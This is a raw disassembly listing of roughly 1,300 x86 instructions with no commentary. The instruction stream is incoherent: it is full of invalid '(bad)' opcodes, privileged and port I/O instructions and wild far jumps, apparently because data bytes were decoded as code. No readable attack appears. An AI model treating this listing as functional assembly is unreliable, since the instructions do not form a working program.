  41da64:	lods   eax,DWORD PTR ds:[esi]
  41da65:	pushf  
  41da66:	cwde   
  41da67:	jo     0x41da05
  41da69:	and    DWORD PTR [esi],ecx
  41da6b:	out    dx,al
  41da6c:	fnsave [esi]
  41da6e:	(bad)  
  41da6f:	jg     0x41da41
  41da71:	jb     0x41dab7
  41da73:	mov    dh,0x44
  41da75:	lock sbb DWORD PTR [edi],esp
  41da78:	push   edx
  41da79:	cmp    DWORD PTR [ebp+0x25],edx
  41da7c:	mov    fs,esp
  41da7e:	out    dx,eax
  41da7f:	cmc    
  41da80:	push   0x5796ba71
  41da85:	mov    ecx,0x2b330955
  41da8a:	or     BYTE PTR [ecx-0x30749c38],bl
  41da90:	jge    0x41da90
  41da92:	fld    QWORD PTR [edx+0x13]
  41da95:	js     0x41db0c
  41da97:	sub    eax,0xffcda5e5
  41da9c:	imul   edx,DWORD PTR [ebx+0x7b9bea87],0x59b2ef51
  41daa6:	jne    0x41da71
  41daa8:	push   ebp
  41daa9:	rol    BYTE PTR [eax+0x16],0x88
  41daad:	xchg   DWORD PTR [eax-0x5b3e392b],eax
  41dab3:	push   edx
  41dab4:	mov    WORD PTR [edi+0x1ba33b96],es
  41daba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dabb:	mov    ds:0x7e36ea49,eax
  41dac0:	mov    ch,BYTE PTR [ecx+0x51]
  41dac3:	(bad)  
  41dac5:	fidiv  WORD PTR [eax]
  41dac7:	ins    BYTE PTR es:[edi],dx
  41dac8:	repnz dec esp
  41daca:	rcr    BYTE PTR [edx+0x5bfbeffe],0x84
  41dad1:	xchg   ebx,eax
  41dad2:	cli    
  41dad3:	popa   
  41dad4:	mov    dh,ch
  41dad6:	repnz xchg edx,eax
  41dad8:	xchg   DWORD PTR [edx+0x2e0492b2],edx
  41dade:	(bad)  
  41dadf:	loope  0x41db24
  41dae1:	aam    0x93
  41dae3:	or     edi,DWORD PTR [ebx-0x37]
  41dae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dae7:	jnp    0x41db54
  41dae9:	and    bl,BYTE PTR ds:0x7c0389
	...
  41db53:	add    BYTE PTR [eax],al
  41db55:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41db5c:	cmp    al,0x5f
  41db5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db5f:	push   edi
  41db60:	sbb    ebp,0x40
  41db63:	pop    ebp
  41db64:	jb     0x41db4b
  41db66:	addr16 aas 
  41db68:	add    DWORD PTR [eax],eax
  41db6a:	add    BYTE PTR [ecx],al
  41db6c:	add    BYTE PTR [eax],al
  41db6e:	loopne 0x41dbe2
  41db70:	xor    BYTE PTR [ebx-0x2b],dh
  41db73:	push   esp
  41db74:	sub    eax,0x266ff439
  41db79:	inc    edx
  41db7a:	(bad)
  41db7e:	cmc    
  41db7f:	cdq    
  41db80:	cs push 0xffffffee
  41db83:	inc    esp
  41db84:	or     DWORD PTR [edx+eiz*8+0x21d23ac6],edi
  41db8b:	jbe    0x41db72
  41db8d:	mov    esi,DWORD PTR ds:0xc5104ef3
  41db93:	xchg   esp,eax
  41db94:	jbe    0x41dbec
  41db96:	call   0x5f77:0xf0041a79
  41db9d:	pop    ecx
  41db9e:	pop    esi
  41db9f:	nop
  41dba0:	xchg   DWORD PTR [edi+0x45],edx
  41dba3:	xor    ch,BYTE PTR [eax-0x35]
  41dba6:	push   es
  41dba7:	pop    eax
  41dba8:	fisub  DWORD PTR [ecx+0x403bffc9]
  41dbae:	and    dh,ah
  41dbb0:	sbb    BYTE PTR [ebx+0x3e],0x1e
  41dbb4:	mov    ecx,0x48c8b92
  41dbb9:	inc    esi
  41dbba:	aas    
  41dbbb:	add    BYTE PTR ds:0x169bdf17,ch
  41dbc1:	sub    ecx,DWORD PTR [edx+esi*2]
  41dbc4:	aad    0xeb
  41dbc6:	inc    edx
  41dbc7:	mov    ebp,0xe3b1275b
  41dbcc:	xchg   esp,eax
  41dbcd:	xor    ebp,DWORD PTR [ebx-0x26]
  41dbd0:	sbb    al,0xc2
  41dbd2:	xor    ebx,ebx
  41dbd4:	adc    al,0x13
  41dbd6:	jecxz  0x41db71
  41dbd8:	sub    eax,0x7a536ed7
  41dbdd:	sbb    edx,DWORD PTR [edx+eax*8-0x3d]
  41dbe1:	inc    ebx
  41dbe2:	loope  0x41db94
  41dbe4:	jb     0x41dbec
  41dbe6:	ret    
  41dbe7:	adc    eax,0xbccb298e
  41dbec:	call   0x8f3fbff1
  41dbf1:	pop    ebx
  41dbf2:	sbb    dl,0x96
  41dbf5:	shl    DWORD PTR [eax+0x32],0x53
  41dbf9:	into   
  41dbfa:	ins    DWORD PTR es:[edi],dx
  41dbfb:	dec    edi
  41dbfc:	sub    al,0xcd
  41dbfe:	int3   
  41dbff:	jmp    0xb4b7:0x344df935
  41dc06:	std    
  41dc07:	mov    ecx,0x6933abc4
  41dc0c:	and    ecx,edx
  41dc0e:	or     BYTE PTR [ebp+0x53e7d814],dh
  41dc14:	das    
  41dc15:	out    dx,al
  41dc16:	push   ebx
  41dc17:	pop    ds
  41dc18:	cli    
  41dc19:	xchg   ebx,eax
  41dc1a:	pushf  
  41dc1b:	xchg   ebp,eax
  41dc1c:	xor    eax,edx
  41dc1e:	mov    esi,0xd140a9e5
  41dc23:	sub    eax,0x16d1756a
  41dc28:	ins    BYTE PTR es:[edi],dx
  41dc29:	pop    ebp
  41dc2a:	pop    ss
  41dc2b:	adc    al,0x7b
  41dc2d:	aad    0x99
  41dc2f:	hlt    
  41dc30:	mov    ecx,0xb9ef917d
  41dc35:	popa   
  41dc36:	(bad)
  41dc39:	retf   
  41dc3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc3b:	cmp    cl,dh
  41dc3d:	mov    eax,ds:0x3affc409
  41dc42:	mov    WORD PTR [ecx+0x4779eccd],gs
  41dc48:	sar    BYTE PTR [edx+0x54],cl
  41dc4b:	inc    ebp
  41dc4c:	into   
  41dc4d:	jnp    0x41dc5c
  41dc4f:	ret    
  41dc50:	inc    eax
  41dc51:	cmp    DWORD PTR [eax],0xffffffde
  41dc54:	jns    0x41dcab
  41dc56:	fimul  DWORD PTR [edx+0x2696c1aa]
  41dc5c:	cmp    DWORD PTR [ebp+0x59],ebp
  41dc5f:	fadd   DWORD PTR [eax+eax*1]
  41dc62:	call   0x72bc335f
  41dc67:	cld    
  41dc68:	mov    ebx,0x66d72faa
  41dc6d:	mov    es,WORD PTR [eax]
	...
  41dcd3:	add    BYTE PTR [eax],al
  41dcd5:	add    BYTE PTR [edi-0x36],ch
  41dcd8:	adc    eax,0xefdfb598
  41dcdd:	jmp    DWORD PTR [edi+0x20b0d050]
  41dce3:	test   ah,0xc
  41dce6:	addr16 inc eax
  41dce8:	add    DWORD PTR [eax],eax
  41dcea:	add    BYTE PTR [ecx],al
  41dcec:	add    BYTE PTR [eax],al
  41dcee:	mov    cl,ah
  41dcf0:	inc    ecx
  41dcf1:	arpl   ax,ax
  41dcf3:	pop    ebp
  41dcf4:	test   ah,bl
  41dcf6:	test   eax,0xfb68ebdd
  41dcfb:	fbld   TBYTE PTR [edx+0x73]
  41dcfe:	mov    esi,0xc061b1b3
  41dd03:	adc    BYTE PTR [ecx],0x53
  41dd06:	aam    0x63
  41dd08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd09:	sbb    al,ch
  41dd0b:	call   0xc3cd:0x23e6d98b
  41dd12:	xor    DWORD PTR [edx+0x6d],ebx
  41dd15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd16:	xor    BYTE PTR [ebx+0x184f63bc],ah
  41dd1c:	test   al,0x3f
  41dd1e:	call   0xe1fb:0x811f57ec
  41dd25:	sbb    eax,0x91b820fb
  41dd2a:	jb     0x41dd3a
  41dd2c:	cmp    BYTE PTR [edx-0x2b],dl
  41dd2f:	jg     0x41dcbe
  41dd31:	mov    bl,0xf2
  41dd33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd34:	sub    eax,0x1cb44367
  41dd39:	inc    ebx
  41dd3a:	sbb    esi,ebp
  41dd3c:	mov    fs,WORD PTR [ebx+edi*1]
  41dd3f:	aad    0xa4
  41dd41:	gs (bad) 
  41dd43:	pop    ds
  41dd44:	sbb    esi,DWORD PTR [edi-0x7e]
  41dd47:	push   edi
  41dd48:	cmp    ebp,DWORD PTR [edx+0x5f]
  41dd4b:	fsub   QWORD PTR [edx-0x70]
  41dd4e:	loope  0x41dcd1
  41dd50:	mov    edx,0x740936ae
  41dd55:	pop    ecx
  41dd56:	js     0x41dd65
  41dd58:	scas   eax,DWORD PTR es:[edi]
  41dd59:	aas    
  41dd5a:	xor    al,BYTE PTR gs:[eax]
  41dd5d:	push   ds
  41dd5e:	ss jle 0x41dce2
  41dd61:	pop    es
  41dd62:	add    dh,bl
  41dd64:	sub    al,0x43
  41dd66:	mov    ah,0x73
  41dd68:	mov    al,ds:0xcc957c6f
  41dd6d:	loope  0x41dd61
  41dd6f:	mov    cl,0xd1
  41dd71:	stc    
  41dd72:	mov    bh,0x92
  41dd74:	dec    edx
  41dd75:	dec    BYTE PTR [esi]
  41dd77:	fbstp  TBYTE PTR [ecx+0x76]
  41dd7a:	sub    DWORD PTR [ecx-0x6c],ebx
  41dd7d:	ret    
  41dd7e:	ds aaa 
  41dd80:	jl     0x41dd6f
  41dd82:	push   0x39
  41dd84:	and    eax,0x72d877cd
  41dd89:	push   esi
  41dd8a:	lock push ds
  41dd8c:	sti    
  41dd8d:	push   0x9a0bbd2e
  41dd92:	jl     0x41dda8
  41dd94:	jp     0x41dd41
  41dd96:	loop   0x41dda6
  41dd98:	aaa    
  41dd99:	inc    esp
  41dd9a:	sub    al,0x3
  41dd9c:	mov    bh,BYTE PTR [edi-0x4b]
  41dd9f:	imul   ecx,DWORD PTR [edx-0x1a],0x3f
  41dda3:	cdq    
  41dda4:	cmp    al,0x8e
  41dda6:	fistp  DWORD PTR ds:0x19bf5e27
  41ddac:	sbb    edi,DWORD PTR [ebx+0x5759d1cc]
  41ddb2:	imul   ebp,DWORD PTR [edi+0x507715d5],0x2ef846cf
  41ddbc:	add    edi,DWORD PTR [edx-0x57605a99]
  41ddc2:	lea    ecx,[ebx-0x71]
  41ddc5:	jb     0x41dde0
  41ddc7:	ins    BYTE PTR es:[edi],dx
  41ddc8:	xchg   esi,eax
  41ddc9:	in     eax,0x3b
  41ddcb:	stos   BYTE PTR es:[edi],al
  41ddcc:	test   DWORD PTR [eax-0x62c36738],eax
  41ddd2:	xchg   ebx,eax
  41ddd3:	not    BYTE PTR [ebp-0x7fa43e76]
  41ddd9:	and    al,0x8d
  41dddb:	mov    esp,0x8e7c95f9
  41dde0:	push   es
  41dde1:	enter  0xc2b5,0x66
  41dde5:	jp     0x41ddec
  41dde7:	shl    BYTE PTR [eax-0xd],1
  41ddea:	cmp    al,0x4f
  41ddec:	les    ebp,FWORD PTR [eax+eax*1+0x0]
	...
  41de54:	add    BYTE PTR [eax],al
  41de56:	and    bl,dh
  41de58:	das    
  41de59:	cmp    bh,0xde
  41de5c:	lods   eax,DWORD PTR ds:[esi]
  41de5d:	repz pop ds
  41de5f:	mov    bl,BYTE PTR [esi-0x41]
  41de62:	shl    DWORD PTR [edx-0x3b],1
  41de65:	inc    edx
  41de66:	addr16 inc ecx
  41de68:	add    DWORD PTR [eax],eax
  41de6a:	add    BYTE PTR [ecx],al
  41de6c:	add    BYTE PTR [eax],al
  41de6e:	push   eax
  41de6f:	das    
  41de70:	out    dx,eax
  41de71:	daa    
  41de72:	pop    ebp
  41de73:	test   al,0xad
  41de75:	ror    edi,0x5b
  41de78:	nop
  41de79:	xor    al,BYTE PTR [edx+0x534255fc]
  41de7f:	test   eax,0xadcf9009
  41de84:	loop   0x41de70
  41de86:	jnp    0x41de6d
  41de88:	dec    ebx
  41de89:	out    dx,eax
  41de8a:	inc    eax
  41de8b:	scas   al,BYTE PTR es:[edi]
  41de8c:	xchg   DWORD PTR [eax+0x4],ecx
  41de8f:	(bad)  
  41de90:	add    BYTE PTR ds:0x8c9b898,0x3c
  41de97:	adc    dl,ah
  41de99:	les    esi,FWORD PTR [ecx-0x46e6a598]
  41de9f:	out    0xd9,eax
  41dea1:	xchg   edx,eax
  41dea2:	push   esp
  41dea3:	icebp  
  41dea4:	jg     0x41defd
  41dea6:	dec    edx
  41dea7:	push   ecx
  41dea8:	jo     0x41de6f
  41deaa:	xchg   ebx,eax
  41deab:	and    al,0xcd
  41dead:	cmp    eax,0x4dc6a7b0
  41deb2:	clc    
  41deb3:	or     al,bl
  41deb5:	inc    ebp
  41deb6:	ins    DWORD PTR es:[edi],dx
  41deb7:	in     eax,0x6a
  41deb9:	mov    ds:0x2bca6e87,eax
  41debe:	jmp    0x41de8f
  41dec0:	arpl   WORD PTR [ecx],di
  41dec2:	into   
  41dec3:	jmp    0x41de49
  41dec5:	loop   0x41def7
  41dec7:	xor    bl,dh
  41dec9:	dec    edi
  41deca:	add    eax,DWORD PTR [eax-0x70]
  41decd:	aam    0xc0
  41decf:	inc    edi
  41ded0:	ss dec ebx
  41ded2:	cld    
  41ded3:	push   ebx
  41ded4:	mov    ?,WORD PTR [edx-0x5d]
  41ded7:	mov    bh,0x93
  41ded9:	sub    bh,BYTE PTR [esi-0x59]
  41dedc:	pop    eax
  41dedd:	(bad)  
  41dede:	dec    ecx
  41dedf:	and    ebx,0x797bd3b3
  41dee5:	sub    al,al
  41dee7:	jge    0x41df56
  41dee9:	fcomp  QWORD PTR [ebx-0x32b70c7e]
  41deef:	push   0x33881295
  41def4:	lods   al,BYTE PTR ds:[esi]
  41def5:	jmp    0x7e5e:0x56fef500
  41defc:	mov    edi,0xfb63f24e
  41df01:	(bad)  
  41df02:	lea    ecx,[ebx-0x36650887]
  41df08:	jmp    0x41df10
  41df0a:	mov    ecx,0x5f55cef2
  41df0f:	imul   ebp,DWORD PTR [edx],0x37e21b8b
  41df15:	fild   DWORD PTR [ebx+0x3e6e0713]
  41df1b:	push   es
  41df1c:	lds    ebp,FWORD PTR [edi]
  41df1e:	cmp    edi,DWORD PTR [ebx-0x59ed6761]
  41df24:	sbb    dl,cl
  41df26:	jnp    0x41deb3
  41df28:	ror    DWORD PTR [esi-0x64],0x8d
  41df2c:	push   esp
  41df2d:	ds fucom st(4)
  41df30:	hlt    
  41df31:	shl    BYTE PTR [eax-0x1e],0xa3
  41df35:	mov    edx,0x967a4f96
  41df3a:	cmp    eax,0xf6cc66f6
  41df3f:	dec    edx
  41df40:	sub    al,0xfb
  41df42:	and    eax,0x20d97711
  41df47:	jno    0x41df15
  41df49:	pop    ds
  41df4a:	or     DWORD PTR [ebx+0x69],0x1c1af35e
  41df51:	xor    ch,dh
  41df53:	push   edx
  41df54:	into   
  41df55:	pop    esi
  41df56:	mov    ebp,0xe775c26
  41df5b:	xchg   edx,eax
  41df5c:	pop    ecx
  41df5d:	jno    0x41df69
  41df5f:	rol    DWORD PTR [eax-0x3a620da0],0x44
  41df66:	dec    eax
  41df67:	mov    esp,0xbbb70e98
  41df6c:	xchg   ecx,eax
  41df6d:	add    BYTE PTR cs:[eax],al
	...
  41dfd4:	add    BYTE PTR [eax],al
  41dfd6:	aas    
  41dfd7:	daa    
  41dfd8:	push   ss
  41dfd9:	cld    
  41dfda:	push   ds
  41dfdb:	std    
  41dfdc:	jmp    edi
  41dfde:	dec    edi
  41dfdf:	push   0x39539ce9
  41dfe4:	cld    
  41dfe5:	ja     0x41e04e
  41dfe7:	inc    edx
  41dfe8:	add    DWORD PTR [eax],eax
  41dfea:	add    BYTE PTR [ecx],al
  41dfec:	add    BYTE PTR [eax],al
  41dfee:	lds    esp,FWORD PTR [ecx+ecx*1]
  41dff1:	ret    0x604f
  41dff4:	addr16 lahf 
  41dff6:	push   0xffffff9a
  41dff8:	fdivp  st(0),st
  41dffa:	fistp  WORD PTR [esi+esi*8+0x2e9629d9]
  41e001:	push   esp
  41e002:	or     ebx,edi
  41e004:	ror    DWORD PTR [edx+edi*8-0x6a],1
  41e008:	out    0xd7,eax
  41e00a:	xor    al,0xaa
  41e00c:	add    DWORD PTR [eax+0x1e],edx
  41e00f:	icebp  
  41e010:	add    DWORD PTR [esi],esp
  41e012:	mov    cl,0x4a
  41e014:	icebp  
  41e015:	xchg   BYTE PTR [edi+ecx*8+0x9],cl
  41e019:	(bad)  
  41e01a:	hlt    
  41e01b:	and    eax,DWORD PTR [ebx+0x59cd84b2]
  41e021:	pusha  
  41e022:	push   eax
  41e023:	adc    BYTE PTR [ebp+0x76c742a6],ah
  41e029:	mov    ah,0x11
  41e02b:	fbld   TBYTE PTR ds:0x7676aa97
  41e031:	dec    edx
  41e032:	int3   
  41e033:	fwait
  41e034:	rol    DWORD PTR [ecx+ebx*4+0x2fd6d4f7],0x17
  41e03c:	jmp    0xcf173c39
  41e041:	fsubr  st,st(4)
  41e043:	popf   
  41e044:	and    esp,DWORD PTR [ebx]
  41e046:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e047:	push   DWORD PTR [esi+0x3b604574]
  41e04d:	xor    DWORD PTR [eax-0x5e7089a6],0xffffffbb
  41e054:	retf   
  41e055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e056:	sub    eax,0x369136f2
  41e05b:	or     DWORD PTR [eax+0x64],edx
  41e05e:	push   esp
  41e05f:	mov    dh,0xf6
  41e061:	cmp    eax,0x7e310e39
  41e066:	(bad)  
  41e067:	fs inc esi
  41e069:	jmp    0x6bd9:0x6d00a13e
  41e070:	mov    BYTE PTR [edx+ebx*4],dl
  41e073:	int3   
  41e074:	out    0xf9,al
  41e076:	mov    bh,BYTE PTR [eax+0x549290d4]
  41e07c:	pop    ebx
  41e07d:	fiadd  WORD PTR [edi]
  41e07f:	jns    0x41e051
  41e081:	sbb    al,0xc2
  41e083:	dec    esi
  41e084:	mov    WORD PTR [eax+ecx*2+0x3ab5c2c9],gs
  41e08b:	pop    ebx
  41e08c:	pop    esi
  41e08d:	xchg   edi,eax
  41e08e:	or     eax,0x528b4e71
  41e093:	std    
  41e094:	test   al,0x75
  41e096:	inc    edi
  41e097:	sub    ebp,edi
  41e099:	rol    DWORD PTR [ebp+0x19ef2e0a],1
  41e09f:	inc    ecx
  41e0a1:	xchg   ecx,eax
  41e0a2:	scas   eax,DWORD PTR es:[edi]
  41e0a3:	mov    ax,ds:0xbfba0f0b
  41e0a9:	idiv   BYTE PTR [ebp-0x2deec10f]
  41e0af:	fisubr WORD PTR [edx]
  41e0b1:	xchg   ebx,eax
  41e0b2:	iret   
  41e0b3:	jno    0x41e111
  41e0b5:	mov    WORD PTR [edx-0x6f],ss
  41e0b8:	icebp  
  41e0b9:	jo     0x41e0cc
  41e0bb:	mov    esp,0xe4686e83
  41e0c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0c1:	shl    BYTE PTR [ebp-0x10],1
  41e0c4:	jno    0x41e12f
  41e0c6:	jmp    0x61f2:0x71ae35e6
  41e0cd:	add    DWORD PTR [ebx],eax
  41e0cf:	sub    esi,DWORD PTR [esp]
  41e0d2:	mov    edx,ds
  41e0d4:	sti    
  41e0d5:	add    eax,0xd91544fc
  41e0da:	call   DWORD PTR ds:0x27964218
  41e0e0:	out    dx,eax
  41e0e1:	loop   0x41e13a
  41e0e3:	sar    edx,1
  41e0e5:	shl    DWORD PTR [esp+eax*4-0x44df5d91],cl
  41e0ec:	loopne 0x41e11d
	...
  41e156:	dec    edi
  41e157:	push   ebx
  41e158:	add    al,0xc
  41e15a:	sbb    al,0x5f
  41e15c:	dec    edi
  41e15d:	push   ebx
  41e15e:	out    0x6d,eax
  41e160:	aad    0x48
  41e162:	adc    al,0xa1
  41e164:	retf   0x67f8
  41e167:	inc    ebx
  41e168:	add    DWORD PTR [eax],eax
  41e16a:	add    BYTE PTR [ecx],al
  41e16c:	add    BYTE PTR [eax],al
  41e16e:	push   ecx
  41e16f:	add    DWORD PTR [ebp+0x16516d78],0x41a91bd7
  41e179:	sti    
  41e17a:	pop    ss
  41e17b:	and    al,0xf3
  41e17d:	fbld   TBYTE PTR [ecx-0x61]
  41e180:	js     0x41e1ec
  41e182:	cmp    eax,0x9d371c19
  41e187:	cmp    bh,bl
  41e189:	xor    eax,0x5367e88c
  41e18e:	rcl    edi,1
  41e190:	pop    esi
  41e191:	pop    esi
  41e192:	stos   BYTE PTR es:[edi],al
  41e193:	jp     0x41e1a2
  41e195:	sub    ah,cl
  41e197:	retf   0x51ad
  41e19a:	xchg   ebx,eax
  41e19b:	out    dx,al
  41e19c:	xchg   edi,eax
  41e19d:	or     esi,DWORD PTR [edi]
  41e19f:	lods   eax,DWORD PTR ds:[esi]
  41e1a0:	pop    es
  41e1a1:	rcr    DWORD PTR [ebx+0x37],cl
  41e1a4:	or     eax,0x7ab21606
  41e1a9:	sbb    eax,0xff2ab01b
  41e1ae:	pop    edx
  41e1af:	repz inc ebp
  41e1b1:	(bad)  
  41e1b3:	mov    bl,0x68
  41e1b5:	outs   dx,DWORD PTR ds:[esi]
  41e1b6:	and    BYTE PTR [edx-0x57f857e5],dl
  41e1bc:	mov    ds:0xc773023a,eax
  41e1c1:	add    DWORD PTR [eax],ebp
  41e1c3:	lea    edi,[ecx+0x59]
  41e1c6:	sub    al,0x37
  41e1c8:	add    eax,ebx
  41e1ca:	test   DWORD PTR [eax],0x25d6dd32
  41e1d0:	inc    eax
  41e1d1:	out    0x29,eax
  41e1d3:	inc    ebx
  41e1d4:	mov    ch,0xac
  41e1d6:	inc    ebx
  41e1d7:	mov    dh,0xd4
  41e1d9:	in     al,dx
  41e1da:	popf   
  41e1db:	loope  0x41e19f
  41e1dd:	test   eax,0xa7369941
  41e1e2:	popf   
  41e1e3:	ins    BYTE PTR es:[edi],dx
  41e1e4:	or     DWORD PTR [ebx-0x5b39dab],edi
  41e1ea:	mov    ecx,0xf1f37338
  41e1ef:	popa   
  41e1f0:	pop    ebx
  41e1f1:	and    ebp,DWORD PTR [ecx]
  41e1f3:	dec    ebx
  41e1f4:	in     eax,dx
  41e1f5:	ror    DWORD PTR [ebx],1
  41e1f7:	sub    al,0x97
  41e1f9:	je     0x41e1ae
  41e1fb:	imul   esi,DWORD PTR [edx-0x33],0x11b543c9
  41e202:	sbb    BYTE PTR [esi],0x36
  41e205:	ss (bad) 
  41e207:	daa    
  41e208:	shl    DWORD PTR ds:0xc457e23d,1
  41e20e:	sub    al,0x5c
  41e210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e211:	mov    ds:0x6bf2ad03,eax
  41e216:	xchg   ecx,eax
  41e217:	and    BYTE PTR [ebp-0x3421fd8a],bl
  41e21d:	jns    0x41e1ee
  41e21f:	pop    edi
  41e220:	in     al,0xff
  41e222:	or     cl,bh
  41e224:	push   ecx
  41e225:	mov    ?,edx
  41e227:	adc    ecx,DWORD PTR ds:0x90fceb35
  41e22d:	and    DWORD PTR [eax-0x9],esi
  41e230:	xchg   dl,dl
  41e232:	fsub   DWORD PTR [edx-0x31]
  41e235:	fcmovne st,st(1)
  41e237:	push   ds
  41e238:	pop    ds
  41e239:	imul   ecx,esp,0xf8438256
  41e23f:	pop    es
  41e240:	fs ror bl,cl
  41e243:	sub    DWORD PTR [eax+0x63],edx
  41e246:	or     bl,BYTE PTR [edx+eiz*1-0x1f]
  41e24a:	ja     0x41e1e9
  41e24c:	enter  0x50bf,0x8a
  41e250:	outs   dx,DWORD PTR ds:[esi]
  41e251:	add    al,BYTE PTR [edi+0x409b3f63]
  41e257:	cwde   
  41e258:	sub    edx,DWORD PTR [ecx]
  41e25a:	jbe    0x41e207
  41e25c:	inc    esi
  41e25d:	(bad)  
  41e25e:	shr    ch,cl
  41e260:	mov    DWORD PTR [ebx-0x7c],ebx
  41e263:	fisub  WORD PTR [ecx]
  41e265:	(bad)  
  41e266:	int    0x3f
  41e268:	jmp    0x41e2ad
  41e26a:	mov    ecx,0x58bf70
	...
  41e2d3:	add    BYTE PTR [eax],al
  41e2d5:	add    BYTE PTR [ebx-0x1988fe],ch
  41e2db:	idiv   DWORD PTR [ebx+0x6f64c34f]
  41e2e1:	or     al,0x9b
  41e2e3:	and    bh,BYTE PTR [edi+0x35]
  41e2e6:	addr16 inc esp
  41e2e8:	add    DWORD PTR [eax],eax
  41e2ea:	add    BYTE PTR [ecx],al
  41e2ec:	add    BYTE PTR [eax],al
  41e2ee:	jge    0x41e352
  41e2f0:	pop    edx
  41e2f1:	dec    eax
  41e2f2:	sub    al,0x4e
  41e2f4:	jno    0x41e2d1
  41e2f6:	xchg   esp,eax
  41e2f7:	sub    BYTE PTR [esp+ebx*1+0x3ce19766],al
  41e2fe:	jns    0x41e2eb
  41e300:	sbb    al,0xa0
  41e302:	jl     0x41e321
  41e304:	mov    bl,dl
  41e306:	div    BYTE PTR [eax-0x1f]
  41e309:	mov    DWORD PTR [ecx-0x5638a75],edx
  41e30f:	pop    es
  41e310:	push   eax
  41e311:	cmp    al,0x20
  41e313:	outs   dx,DWORD PTR ds:[esi]
  41e314:	mov    dh,0xff
  41e316:	push   edi
  41e317:	stc    
  41e318:	out    dx,eax
  41e319:	jg     0x41e29b
  41e31b:	add    DWORD PTR [edx-0x38],0x64c19075
  41e322:	imul   esp,DWORD PTR [ebp+0x21aa4e25],0x34d936e5
  41e32c:	popf   
  41e32d:	push   ebx
  41e32e:	pop    esp
  41e32f:	xchg   esp,eax
  41e330:	ror    cl,1
  41e332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e333:	cdq    
  41e334:	mov    dl,0x1f
  41e336:	aad    0x69
  41e338:	push   edx
  41e339:	push   0x17
  41e33b:	loopne 0x41e2be
  41e33d:	(bad)  
  41e33e:	sbb    edi,ecx
  41e340:	je     0x41e2ea
  41e342:	jl     0x41e37a
  41e344:	mov    cl,0x41
  41e346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e347:	pop    eax
  41e348:	pushf  
  41e349:	cmp    DWORD PTR [edi],esi
  41e34b:	test   BYTE PTR [esi+eax*2],al
  41e34e:	in     eax,0x6
  41e350:	(bad)  
  41e351:	cmp    al,0xfc
  41e353:	pop    ebx
  41e354:	(bad)  
  41e355:	jmp    0x786b:0x378a687b
  41e35c:	vshufpd xmm4,xmm6,XMMWORD PTR [eax-0x6d8985a6],0x6b
  41e365:	hlt    
  41e366:	repz push eax
  41e368:	lahf   
  41e369:	leave  
  41e36a:	mov    ebx,0x80728130
  41e36f:	mov    cl,0x3c
  41e371:	add    al,0x1f
  41e373:	shl    DWORD PTR [eax],cl
  41e375:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e376:	add    eax,0x84c9617c
  41e37b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e37c:	(bad)  
  41e37d:	xor    al,BYTE PTR [ebx]
  41e37f:	sub    eax,0x8418362e
  41e384:	fwait
  41e385:	popf   
  41e386:	jle    0x41e327
  41e388:	jg     0x41e360
  41e38a:	push   ds
  41e38b:	retf   0x882a
  41e38e:	mov    ebx,0x9b74043e
  41e393:	(bad)  
  41e394:	leave  
  41e395:	lods   eax,DWORD PTR ds:[esi]
  41e396:	and    DWORD PTR [esi-0x70],edi
  41e399:	cmp    cl,0x23
  41e39c:	mov    al,ds:0xb823153e
  41e3a1:	rcl    DWORD PTR [edi-0xa],1
  41e3a4:	mov    ds:0xcfff2db8,al
  41e3a9:	mov    ecx,0xd36fc419
  41e3ae:	(bad)  
  41e3af:	sub    DWORD PTR ds:0xf6425be2,eax
  41e3b5:	and    al,0x61
  41e3b7:	shl    BYTE PTR [ebx+eax*2-0x51b13240],0x6f
  41e3bf:	jmp    0x41e423
  41e3c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3c2:	popa   
  41e3c3:	mov    bh,0xc4
  41e3c5:	rol    DWORD PTR ds:0x40252727,cl
  41e3cb:	cli    
  41e3cc:	out    0x53,eax
  41e3ce:	sub    eax,edx
  41e3d0:	lock sbb al,0x26
  41e3d3:	mov    ch,0x57
  41e3d5:	daa    
  41e3d6:	push   ebp
  41e3d7:	xchg   DWORD PTR [esi-0x4de590c1],eax
  41e3dd:	or     al,0xc6
  41e3df:	inc    edi
  41e3e0:	shr    edx,1
  41e3e2:	inc    ebp
  41e3e3:	pop    ds
  41e3e4:	ins    DWORD PTR es:[edi],dx
  41e3e5:	out    0xc9,eax
  41e3e7:	call   0xcc97:0x89348da9
	...
  41e456:	mov    DWORD PTR [edx],edx
  41e458:	ja     0x41e479
  41e45a:	(bad)  
  41e45b:	jg     0x41e446
  41e45d:	xchg   esi,eax
  41e45e:	or     DWORD PTR [edx+0x18],0xdfe71d09
  41e465:	clc    
  41e466:	addr16 inc ebp
  41e468:	add    DWORD PTR [eax],eax
  41e46a:	add    BYTE PTR [ecx],al
  41e46c:	add    BYTE PTR [eax],al
  41e46e:	int    0x8a
  41e470:	pop    edi
  41e471:	push   eax
  41e472:	mov    dh,0xe7
  41e474:	mov    esp,0x3cff2692
  41e479:	and    eax,0x9b1a67d6
  41e47e:	pop    ebx
  41e47f:	mov    bh,0xbc
  41e481:	scas   al,BYTE PTR es:[edi]
  41e482:	pop    edx
  41e483:	push   ebp
  41e484:	imul   BYTE PTR [esi]
  41e486:	mov    al,ds:0x656b1029
  41e48b:	mov    ebx,DWORD PTR [eax]
  41e48d:	push   es
  41e48e:	fbld   TBYTE PTR [esi-0x5af66cbc]
  41e494:	fcmovne st,st(5)
  41e496:	sub    al,BYTE PTR [ecx]
  41e498:	gs mov bl,0xb7
  41e49b:	iret   
  41e49c:	pop    ebp
